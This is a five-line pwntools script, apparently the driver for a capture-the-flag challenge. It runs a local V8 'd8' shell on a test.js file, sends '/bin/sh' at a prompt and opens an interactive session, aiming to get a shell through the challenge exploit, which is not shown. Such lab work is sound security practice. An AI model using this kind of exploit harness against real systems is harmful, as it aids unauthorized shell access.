from pwn import *

sh = process(['../challenge/d8', './test.js'])
sh.sendlineafter(b"SEND", b'/bin/sh\x00')
sh.interactive()